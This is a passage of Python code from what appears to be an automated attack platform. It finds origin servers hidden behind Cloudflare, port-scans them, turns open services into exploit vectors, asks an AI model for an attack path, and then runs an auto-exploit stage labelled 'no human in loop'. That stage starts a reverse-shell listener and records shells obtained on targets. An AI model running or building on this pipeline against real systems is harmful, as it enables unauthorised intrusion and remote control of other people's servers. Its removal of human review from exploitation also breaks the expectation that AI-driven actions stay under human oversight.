                pass
        except: pass
        
        # 5. Try DNS dumpster / hackertarget
        try:
            import urllib.request as _urllib
            ht_url = f"https://api.hackertarget.com/hostsearch/?q={root_domain}"
            ht_data = _urllib.urlopen(ht_url, timeout=5).read().decode("utf-8","ignore")
            for line in ht_data.split("\n"):
                if "," in line:
                    parts = line.split(",")
                    if len(parts) >= 2:
                        ip = parts[1].strip()
                        if ip and re.match(r"^\d+\.\d+\.\d+\.\d+$", ip):
                            found_ips.add(ip)
            if found_ips:
                log(eng,"recon",f"cf-bypass: hackertarget found additional origins")
        except:
            pass
        
        # 6. Try Shodan (free tier — just check if IP is known)
        # Can't use shodan API without key, but we can try direct IP checks
        
        # Store findings
        for ip in found_ips:
            if ip not in origins:
                origins.add(ip)
                eng["assets"].append({"type":"cf_origin_candidate","host":root_domain,"candidate":ip})
                log(eng,"recon",f"cf-bypass: ORIGIN CANDIDATE {ip}")
    
    # Now scan the origin candidates for open ports
    if origins:
        log(eng,"recon",f"cf-bypass: {len(origins)} origin candidates found — scanning for open ports")
        # Run naabu on the origin IPs directly
        origin_ports, origin_banners = ad_naabu_aggressive(list(origins), eng)
        if origin_ports:
            eng["origin_ports"] = origin_ports
            eng["origin_banners"] = origin_banners
            log(eng,"recon",f"cf-bypass: ORIGIN PORTS FOUND — {sum(len(v) for v in origin_ports.values())} total")
            # Return the real ports as additional breach surface
            return origin_ports, origin_banners
    else:
        log(eng,"scan","cf-bypass: no origin IPs found — target well-hidden")
    
    return {}, []

# ---------- BREACH ASSESSMENT — THE NUCLEAR OPTION ----------
def build_breach_findings(open_ports, banners, eng):
    """Build exploit-finding objects from open ports + banners."""
    breach_findings = []
    seen = set()
    
    for host, ports in open_ports.items():
        for port, svc_name in ports:
            # Find banner for this port
            banner_info = next((b for b in banners if b.get("port") == port), None)
            svc_base = svc_name.split("-")[0].split(" ")[0].upper() if svc_name else svc_name
            
            # Get exploit hints
            hints = None
            for hint_key in list(EXPLOIT_HINTS.keys()):
                if hint_key in svc_name.upper() or (banner_info and hint_key in banner_info.get("service","").upper()):
                    hints = EXPLOIT_HINTS[hint_key]
                    break
                # Try matching by first word
                if hint_key.split(" ")[0] in svc_name.upper():
                    hints = EXPLOIT_HINTS[hint_key]
                    break
            
            # Get MITRE mapping
            mitre = None
            for mitre_key in list(MITRE_MAP.keys()):
                if mitre_key in svc_name.upper() or (banner_info and mitre_key in banner_info.get("service","").upper()):
                    mitre = MITRE_MAP[mitre_key]
                    break
                if mitre_key.split(" ")[0] in svc_name.upper():
                    mitre = MITRE_MAP[mitre_key]
                    break
            
            if not hints and not mitre:
                # Generic finding for unknown services
                hints = {
                    "vectors": ["Unknown service — manual investigation required", "Check if service is on a non-standard port", "Potential custom application — look for web interfaces, API docs"],
                    "severity": "MEDIUM",
                    "mitre": "T1046"
                }
            
            sev = hints["severity"] if hints else "MEDIUM"
            scores = {"CRITICAL":90,"HIGH":72,"MEDIUM":48}
            
            svc_evidence = f"{host}:{port} = {svc_name}"
            if banner_info and banner_info.get("version"):
                svc_evidence += f" v{banner_info['version']}"
            if banner_info and banner_info.get("banner"):
                svc_evidence += f" [{banner_info['banner'][:80]}]"
            if banner_info and banner_info.get("tls"):
                svc_evidence += " [TLS]"
            
            # Limit to one finding per host:port combo
            key = f"{host}:{port}"
            if key in seen:
                continue
            seen.add(key)
            
            # Pick the most dangerous vector as the title
            best_vector = hints["vectors"][0] if hints else "Open port — potential attack surface"
            
            mitre_tid = mitre["technique"] if mitre else (hints["mitre"] if hints and "mitre" in hints else "T1046")
            mitre_name = mitre["name"] if mitre else "Network Service Scanning"
            mitre_tactic = mitre["tactic"] if mitre else "Discovery"
            
            breach_findings.append({
                "id": str(uuid.uuid4())[:8],
                "severity": sev,
                "score": scores.get(sev, 48),
                "title": f"[BREACH] {svc_name} — {best_vector}",
                "asset": f"{host}:{port}",
                "tool": "breach_engine",
                "cwe": mitre_tid,
                "evidence": svc_evidence,
                "exploitable": True,
                "fix": hints["vectors"][0] if hints else "Investigate and secure the exposed service",
                "retest": "Manual verification required",
                "proof": None,
                "service": svc_name,
                "version": banner_info.get("version","") if banner_info else "",
                "mitre": mitre_tid,
                "mitre_name": mitre_name,
                "mitre_tactic": mitre_tactic,
                "vectors": hints["vectors"] if hints else ["Investigate unknown service"],
                "banner": banner_info.get("banner","") if banner_info else "",
                "tls": banner_info.get("tls", False) if banner_info else False,
            })
    
    return breach_findings

# ---------- AI BREACH NARRATIVE ----------
def ad_breach_assessment(problem, breach_findings, base_url, model, api_key="not-needed"):
    """Feed open ports + banners + exploit hints to the AI model. It figures out the attack path."""
    if not breach_findings:
        return "No exploitable surface detected. Nothing to breach."
    
    # Build a compact assessment payload
    surface = []
    for f in breach_findings:
        surface.append({
            "asset": f["asset"],
            "service": f["service"],
            "version": f["version"],
            "severity": f["severity"],
            "score": f["score"],
            "mitre": f["mitre"],
            "mitre_tactic": f["mitre_tactic"],
            "top_vector": f["vectors"][0] if f["vectors"] else "unknown",
        })
    
    return breach_analyze(problem, surface, base_url, model, api_key)

# ---------- REAL PIPELINE ----------
def run_pipeline(eid, problem, DB, base_url="", model="", api_key="not-needed", repo_path=None):
    eng = DB[eid]
    eng["status"] = "running"; eng["problem"] = problem
    repo_path = repo_path or os.environ.get("VERDICT_REPO")
    phases = ["SCOPE GATE","RECON","SCAN","GRAPH","BREACH ASSESSMENT","AUTO-EXPLOIT","PROOF","RANK"]
    eng["phases"] = {p:0 for p in phases}
    ph = lambda p,v: eng["phases"].update({p:v})
    
    # Get AI planning if model is available
    tools, planner_src = plan(problem, eng["scope"], base_url, model, api_key)
    eng["planner"] = planner_src
    log(eng,"gate",f"planner: {planner_src}")
    log(eng,"gate",f"tool plan: {' -> '.join(tools) if tools else 'none'}")

    root = None
    for s in eng["scope"]:
        root = s[2:] if s.startswith("*.") else (s.replace("https://","").replace("http://","").split("/")[0] if "://" in s else s)
        if root: break
    if not root: root = "example.com"

    ph("SCOPE GATE",30)
    log(eng,"gate",f"engagement approved scope={len(eng['scope'])} exclusions={len(eng['exclusions'])}")
    for t in eng["scope"]: log(eng,"gate",f"ALLOW {t}")
    for x in eng["exclusions"]: log(eng,"gate",f"EXCLUDE {x}")
    set_scope(eng["scope"], eng["exclusions"], enforce=True)
    log(eng,"gate","exploit scope gate ARMED — dispatch/run_auto_exploit will refuse out-of-scope targets")
    missing = [t for t in ("subfinder","httpx","naabu","nuclei") if not tool(t)]
    if missing: log(eng,"gate",f"tools missing: {', '.join(missing)} — recon will be partial")
    ph("SCOPE GATE",100)

    ph("RECON",10)
    subs = ad_subfinder(root, eng) if "subfinder" in tools else []
    ph("RECON",35)
    hosts = ad_httpx(subs or [root], eng) if "httpx" in tools else []
    ph("RECON",60)
    hostnames = [h for h in {clean_host(x.get("host") or x.get("url") or "") for x in hosts} if h]
    if root not in hostnames: hostnames.append(root)
    
    # AGGRESSIVE PORT SCAN
    open_ports, banners = ad_naabu_aggressive(hostnames[:20], eng)
    ph("RECON",100)

    ph("SCAN",15)
    urls = [h.get("url") for h in hosts if h.get("url")]
    findings = []
    if "nuclei" in tools: findings += ad_nuclei(urls[:30], eng)
    ph("SCAN",50)
    findings += ad_clientside(urls, eng)
    findings += ad_ai(hostnames, eng)
    ph("SCAN",75)
    findings += ad_secrets(repo_path, eng)
    
    # CLOUDFLARE BYPASS — find real origin IPs behind WAF
    origin_ports, origin_banners = ad_cf_bypass(hostnames, eng)
    if origin_ports:
        log(eng,"recon",f"cf-bypass: origin ports found — merging into breach surface")
        # Merge origin ports into main open_ports for breach assessment
        for oh, oports in origin_ports.items():
            if oh not in open_ports:
                open_ports[oh] = oports
            else:
                existing_ports = set(p for p, _ in open_ports[oh])
                for p, s in oports:
                    if p not in existing_ports:
                        open_ports[oh].append((p, s))
        banners = (banners or []) + (origin_banners or [])
    
    findings += ad_cvemap(banners, hosts, eng)

    ph("SCAN",100)
    eng["findings"] = findings

    ph("GRAPH",40)
    log(eng,"graph",f"asset graph: {len(eng['assets'])} assets, {len(findings)} findings linked")
    ph("GRAPH",100)

    # ---------- BREACH ASSESSMENT (THE NUCLEAR OPTION) ----------
    ph("BREACH ASSESSMENT",10)
    breach_findings = build_breach_findings(open_ports, banners, eng) if open_ports else []
    log(eng,"breach",f"breach engine: {len(breach_findings)} exploit vectors identified")
    ph("BREACH ASSESSMENT",40)
    
    for bf in breach_findings:
        log(eng,"breach",f"VECTOR {bf['severity']} {bf['title']} [{bf['mitre']} {bf['mitre_tactic']}]")
        eng["findings"].append(bf)
    
    # AI breach narrative
    if breach_findings:
        breach_report = ad_breach_assessment(problem, breach_findings, base_url, model, api_key)
        eng["breach_report"] = breach_report or "No AI narrative generated."
        if breach_report:
            log(eng,"breach",f"AI BREACH NARRATIVE: {breach_report.get('summary','')[:200] if isinstance(breach_report, dict) else str(breach_report)[:200]}")
    else:
        eng["breach_report"] = "No exploitable surface detected. Nothing to breach."
        log(eng,"breach","no exploitable surface — clean sweep")
    ph("BREACH ASSESSMENT",100)

    # ---------- AUTO-EXPLOIT (NO HUMAN IN LOOP) ----------
    ph("AUTO-EXPLOIT",10)
    log(eng,"exploit","auto-exploit: starting callback listener + exploit dispatch")
    
    # Get local IP for callbacks
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        lhost = s.getsockname()[0]
        s.close()
    except:
        lhost = "0.0.0.0"
    lport = 4444 + (hash(eid) % 1000)  # unique port per engagement
    
    eng["exploit_lport"] = lport
    eng["exploit_lhost"] = lhost
    
    # Start listener for callbacks
    listener_info = start_listener(lport, timeout=180)
    log(eng,"exploit",f"listener started on {lhost}:{lport}")
    ph("AUTO-EXPLOIT",30)
    
    if breach_findings:
        log(eng,"exploit",f"dispatch: {len(breach_findings)} breach vectors to exploit")
        exploit_results = run_auto_exploit(breach_findings, lhost=lhost, lport=lport)
        eng["exploit_results"] = exploit_results
        shells = exploit_results.get("shells", [])
        log(eng,"exploit",f"exploit complete: {len(shells)} shells obtained")
        if shells:
            for s in shells:
                log(eng,"exploit",f"SHELL OBTAINED: {s['service']} on {s['host']} — {s.get('method','')}")
                eng["proofs"].append({
                    "id":str(uuid.uuid4())[:8],
                    "claim":f"SHELL on {s['host']} via {s['service']}",
                    "evidence":f"Reverse shell callback established: {lhost}:{lport}",
                    "chain":"auto-exploit",
                    "hash":ehash(f"{s['host']}{s['service']}shell"),
                    "state":"SHELL_ESTABLISHED"
                })
            # Set status to include shell info
            eng["shell_established"] = True
            eng["shell_endpoint"] = f"{lhost}:{lport}"
        else:
            log(eng,"exploit","no shells obtained — target may be hardened")
    else:
        log(eng,"exploit","no breach findings — nothing to exploit")
    ph("AUTO-EXPLOIT",100)

    ph("PROOF",40)
    for f in eng["findings"]:
        if f["severity"] in ("CRITICAL","HIGH"):
            f["proof"] = ehash(f.get("evidence","") + f.get("asset",""))
            eng["proofs"].append({"id":str(uuid.uuid4())[:8],"claim":f["title"],
                "evidence":f.get("evidence",""),"chain":f.get("tool",""),
                "hash":f["proof"],"state":"PROVEN"})
            log(eng,"proof",f"PROVEN {f['title']} [{f['proof']}]")
    if not eng["proofs"]: log(eng,"proof","no critical/high findings to prove")
    ph("PROOF",100)

    ph("RANK",40)
    eng["findings"].sort(key=lambda f:-f.get("score",0))
    for f in eng["findings"][:5]:
        log(eng,"rank",f"TOP RISK {f['score']} — {f['title']}")
    if not eng["findings"]: log(eng,"rank","no findings — clean surface or tools missing")
    ph("RANK",100)
    
    eng["status"] = "done"
    log(eng,"done",f"report ready. total findings={len(eng['findings'])} (including {len(breach_findings)} breach vectors)")
